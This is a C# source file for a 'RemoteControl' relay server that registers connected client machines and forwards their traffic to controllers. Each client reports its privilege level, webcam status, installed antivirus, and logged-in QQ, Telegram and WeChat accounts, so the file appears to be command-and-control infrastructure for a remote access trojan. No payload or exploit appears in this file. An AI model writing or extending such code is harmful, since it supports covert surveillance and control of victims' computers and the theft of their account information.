using System;
using System.Threading.Tasks;

namespace RemoteControl.Relay
{
    public partial class RelayServer
    {
        private async Task HandleClientConnectionAsync(ClientSession session, HandshakeData handshake)
        {
            session.Role = "client";
            session.HostName = handshake.HostName;
            session.OnlineAvatar = handshake.OnlineAvatar;
            session.AppPath = handshake.AppPath;
            session.UserName = handshake.UserName;
            session.LocalIP = handshake.LocalIP;
            session.OSVersion = handshake.OSVersion;
            session.Privilege = handshake.Privilege;
            session.CameraStatus = handshake.CameraStatus;
            session.Antivirus = handshake.Antivirus;
            session.OnlineQQ = handshake.OnlineQQ;
            session.TG = handshake.TG;
            session.WX = handshake.WX;
            session.UserStatus = handshake.UserStatus;
            session.Region = handshake.Region;
            session.ISP = handshake.ISP;
            session.OnlineTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

            string clientId = session.SessionId;
            _clients[clientId] = session;
            LogScale("[online] clients=", _clients.Count, session.HostName + " ID=" + clientId);
            await NotifyControllersClientOnlineAsync(session);

            try
            {
                while (IsRunning && session.IsConnected)
                {
                    byte[] packet = await session.ReceivePacketAsync();
                    if (packet == null)
                        break;

                    if (ApplyHostNameResponse(session, packet))
                        await NotifyControllersClientOnlineAsync(session);

                    ClientSession controller = session.BoundController;
                    if (controller != null && controller.IsConnected)
                        await controller.SendRawAsync(packet);
                }
            }
            catch { }

            if (_clients.TryRemove(clientId, out _))
            {
                LogScale("[offline] clients=", _clients.Count, session.HostName + " ID=" + clientId);
                await NotifyControllersClientOfflineAsync(clientId);
            }
            session.Close();
        }

        private bool ApplyHostNameResponse(ClientSession session, byte[] packet)
        {
            HostNameData info = PacketCodec.DecodeHostNameResponse(packet);
            if (info == null)
                return false;

            session.HostName = string.IsNullOrEmpty(info.HostName) ? session.HostName : info.HostName;
            session.AppPath = info.AppPath;
            session.OnlineAvatar = info.OnlineAvatar;
            session.UserName = info.UserName;
            session.LocalIP = info.LocalIP;
            session.OSVersion = info.OSVersion;
            session.Privilege = info.Privilege;
            session.CameraStatus = info.CameraStatus;
            session.Antivirus = info.Antivirus;
            session.OnlineQQ = info.OnlineQQ;
            session.TG = info.TG;
            session.WX = info.WX;
            session.UserStatus = info.UserStatus;
            session.Region = info.Region;
            session.ISP = info.ISP;
            return true;
        }

        private async Task NotifyControllersClientOnlineAsync(ClientSession client)
        {
            byte[] packet = PacketCodec.BuildClientOnline(client);
            foreach (var kv in _controllers)
            {
                try { await kv.Value.SendRawAsync(packet); } catch { }
            }
        }

        private async Task NotifyControllersClientOfflineAsync(string clientId)
        {
            byte[] packet = PacketCodec.BuildClientOffline(clientId);
            foreach (var kv in _controllers)
            {
                try { await kv.Value.SendRawAsync(packet); } catch { }
            }
        }
    }
}
